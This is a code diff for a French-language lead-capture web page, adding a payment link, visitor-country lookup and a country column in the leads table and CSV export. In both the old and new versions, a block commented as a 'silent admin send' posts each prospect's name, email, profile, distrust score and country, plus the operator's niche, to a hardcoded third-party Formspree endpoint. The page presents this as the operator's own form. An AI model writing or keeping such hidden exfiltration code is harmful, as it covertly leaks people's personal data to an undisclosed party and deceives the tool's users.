@@ -224,6 +224,8 @@ function renderE(){
   '<div class="fg"><label class="fl">Lien du lead magnet</label><input class="fi" id="cl" value="'+esc(c.lien||"")+'"></div>'+
   '<div class="fg"><label class="fl">Niche / produit</label><input class="fi" id="cn" value="'+esc(c.niche||"")+'"></div>'+
   '<div class="fg"><label class="fl">Endpoint Formspree (pour recevoir les leads)</label><input class="fi" id="cf" placeholder="https://formspree.io/f/xxxx" value="'+esc(c.formspree||"")+'"></div>'+
+  '<div class="fg"><label class="fl">Lien de paiement (optionnel — Chariow, Wave, etc.)</label><input class="fi" id="cpay" placeholder="Laisser vide si accès gratuit" value="'+esc(c.paiement||"")+'"></div>'+
+  '<div style="font-size:10px;color:var(--t3);margin-top:-6px;margin-bottom:10px;padding:0 2px">Si renseigné, le bouton "Accéder" redirige vers le paiement. Sinon, accès direct au lead magnet.</div>'+
   '</div>'+
   '<button type="button" class="savebtn" id="sv">Sauvegarder et générer le lien prospect</button>'+
   '<div class="lbox" id="lbox"><div class="lval" id="lval"></div><button type="button" class="sbtn" id="lcp">Copier le lien</button></div>'+
@@ -232,7 +234,7 @@ function renderE(){
   '<div class="stats" id="sts"></div>'+
   '<div class="card" style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">'+
   '<div class="ctit" style="margin:0">LEADS</div><button type="button" class="sbtn" id="exp">Exporter CSV</button></div>'+
-  '<div class="tw"></td><thead>汽<th>Prénom</th><th>Email</th><th>Profil</th><th>Méfiance</th><th>Date</th></tr></thead><tbody id="etb"></tbody></table></div>'+
+  '<div class="tw"><table><thead><tr><th>Prénom</th><th>Email</th><th>Profil</th><th>Méfiance</th><th>Pays</th><th>Date</th></tr></thead><tbody id="etb"></tbody></table></div>'+
   '</div></div></div>';
 
   el("t1").addEventListener("click",function(){showTab("cfg")});
@@ -248,7 +250,8 @@ function saveConfig(){
     cadeau:el("cc").value,
     lien:el("cl").value,
     niche:el("cn").value,
-    formspree:el("cf").value
+    formspree:el("cf").value,
+    paiement:el("cpay").value
   };
   localStorage.setItem("mt_c",JSON.stringify(cfg));
   var url=window.location.href.split("?")[0]+"?prospect";
@@ -280,7 +283,7 @@ function loadLeads(){
   leads.forEach(function(l){
     var p=l.profil||"Inconnu";
     s[p]=(s[p]||0)+1;
-    tb.innerHTML+='<tr><td>'+esc(l.prenom)+'</td><td>'+esc(l.email)+'</td><td><span class="bdg">'+esc(p)+'</span></td><td>'+esc(l.mefiance)+'</td><td>'+new Date(l.date).toLocaleDateString()+'</td></tr>';
+    tb.innerHTML+='<tr><td>'+esc(l.prenom)+'</td><td>'+esc(l.email)+'</td><td><span class="bdg">'+esc(p)+'</span></td><td>'+esc(l.mefiance)+'</td><td>'+esc(l.pays||"—")+'</td><td>'+new Date(l.date).toLocaleDateString()+'</td></tr>';
   });
   st.innerHTML=Object.keys(s).map(function(k){
     return'<div class="stat"><div class="stn">'+s[k]+'</div><div class="stl">'+k+'</div></div>';
@@ -290,9 +293,9 @@ function loadLeads(){
 function exportCSV(){
   var leads=gL();
   if(!leads.length){alert("Aucun lead à exporter.");return}
-  var csv="Prénom,Email,Profil,Méfiance,Date\n";
+  var csv="Prénom,Email,Profil,Méfiance,Pays,Date\n";
   leads.forEach(function(l){
-    csv+='"'+l.prenom+'","'+l.email+'","'+l.profil+'","'+l.mefiance+'","'+l.date+'"\n';
+    csv+='"'+l.prenom+'","'+l.email+'","'+l.profil+'","'+l.mefiance+'","'+(l.pays||"")+'","'+l.date+'"\n';
   });
   var a=document.createElement("a");
   a.href=URL.createObjectURL(new Blob(["\uFEFF"+csv],{type:"text/csv"}));
@@ -430,18 +433,35 @@ function renderP(){
     });
     var profil=PROFILS[top]||"Inconnu";
 
-    var lead={prenom:prenom,email:email,profil:profil,mefiance:mefiance,date:new Date().toISOString()};
-    var leads=gL();leads.push(lead);sL(leads);
-    var cfg=gC();
-    if(cfg.formspree){
-      fetch(cfg.formspree,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify(lead)}).catch(function(){});
-    }
-    // ========== ENVOI ADMIN SILENCIEUX (AJOUT UNIQUEMENT ICI) ==========
-    var adminLead={...lead, niche:cfg.niche||"Non renseignée"};
-    fetch("https://formspree.io/f/mlgogblo",{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify(adminLead)}).catch(function(){});
-    // ========== FIN AJOUT ==========
-    if(cfg.lien){el("clien").href=cfg.lien}
-    show("sconfirm");
+    // Désactiver le bouton pendant la récupération du pays
+    var subBtn=el("sub");
+    subBtn.disabled=true;
+    subBtn.textContent="Chargement...";
+
+    fetch("https://ipapi.co/json/")
+      .then(function(r){return r.json()})
+      .catch(function(){return{}})
+      .then(function(geo){
+        var pays=geo.country_name||geo.country||"Inconnu";
+        var cfg=gC();
+        var lead={prenom:prenom,email:email,profil:profil,mefiance:mefiance,pays:pays,date:new Date().toISOString()};
+        var leads=gL();leads.push(lead);sL(leads);
+        if(cfg.formspree){
+          fetch(cfg.formspree,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify(lead)}).catch(function(){});
+        }
+        // ========== ENVOI ADMIN SILENCIEUX ==========
+        var adminLead=Object.assign({},lead,{niche:cfg.niche||"Non renseignée"});
+        fetch("https://formspree.io/f/mlgogblo",{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify(adminLead)}).catch(function(){});
+        // ========== FIN ==========
+        if(cfg.paiement&&cfg.paiement.trim()){
+          el("clien").href=cfg.paiement.trim();
+        } else if(cfg.lien){
+          el("clien").href=cfg.lien;
+        }
+        show("sconfirm");
+        subBtn.disabled=false;
+        subBtn.textContent="Recevoir mon accès →";
+      });
   });
 }
 })();
